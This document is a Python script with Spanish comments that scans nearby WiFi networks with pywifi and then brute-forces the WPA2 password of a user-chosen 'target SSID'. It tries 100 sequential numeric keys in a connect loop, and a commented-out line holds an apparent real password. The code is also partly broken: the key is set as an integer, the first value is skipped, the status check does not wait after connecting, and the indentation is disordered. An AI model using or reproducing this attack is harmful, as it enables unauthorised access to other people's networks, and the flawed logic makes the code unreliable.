# Importamos la librería principal para manejar WiFi
import pywifi
# Importamos las constantes (estados y tipos de seguridad)
from pywifi import const
# Importamos time para usar pausas y medir tiempo
import time


def calidad_senal(dbm):
    # Conversión aproximada de dBm a porcentaje
    if dbm <= -100:
        return 0
    elif dbm >= -50:
        return 100
    else:
        return 2 * (dbm + 100)

def escanear_redes():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    time.sleep(3)
    resultados = iface.scan_results()

    redes = {}
    contador = 1

    vistos = set()

    for red in resultados:
        if red.ssid and red.ssid not in vistos:
            vistos.add(red.ssid)

            redes[contador] = {
                "SSID": red.ssid,
                "Señal_%": calidad_senal(red.signal)
            }

            contador += 1

    return redes

# Guardado en variable numerada
redes_disponibles = escanear_redes()

# Mostrar resultado
for numero, datos in redes_disponibles.items():
    print(f"{numero} SSID: {datos['SSID']} - Señal: {datos['Señal_%']}%")


# ====== DATOS DE LA RED ====== 

# Nombre de la red WiFi a la que queremos conectarnos
SSID = input("Insert target SSID: ")


# Contraseña de la red
#PASSWORD = "42077087"

# ====== INICIALIZAR WIFI ======

# Creamos el objeto principal de control WiFi
wifi = pywifi.PyWiFi()

# Obtenemos la primera interfaz WiFi disponible (normalmente solo hay una)
iface = wifi.interfaces()[0]

# ====== DESCONECTAR SI YA ESTÁ CONECTADO ======

# Forzamos desconexión por seguridad
#iface.disconnect()

# Esperamos 1 segundo para que termine de desconectar
#time.sleep(1)


# ====== CREAR PERFIL DE CONEXIÓN ======

from itertools import permutations



# Creamos un perfil nuevo de conexión
profile = pywifi.Profile()

# Asignamos el nombre de la red (SSID)
profile.ssid = SSID

# Tipo de autenticación (normalmente abierto para WPA/WPA2)
profile.auth = const.AUTH_ALG_OPEN

# Tipo de seguridad (WPA2-PSK en la mayoría de routers)
profile.akm.append(const.AKM_TYPE_WPA2PSK)

# Tipo de cifrado (CCMP es estándar en WPA2)
profile.cipher = const.CIPHER_TYPE_CCMP

# Eliminamos perfiles guardados anteriormente
iface.remove_all_network_profiles()

# Loop infinito 
password = 42077080
for i in range(100):
    print("Conectando a", SSID, password)
    print("⏳ Esperando conexión...", password)
    # Esperamos 1 segundo antes de volver a verificar
    time.sleep(1) 
    password += 1        
            #print("".join(p))
# ====== APLICAR PERFIL ======
        
# Asignamos la contraseña
    profile.key = password
# Agregamos el nuevo perfil
    tmp_profile = iface.add_network_profile(profile)
# Intentamos conectar usando ese perfil
    iface.connect(tmp_profile)
    # Obtenemos el estado actual de la interfaz WiFi
    status = iface.status()
    # Si está conectado
    if status == const.IFACE_CONNECTED:
        print("✅ Conectado correctamente")
        break
        # Si todavía no conecta, mostramos mensaje
   



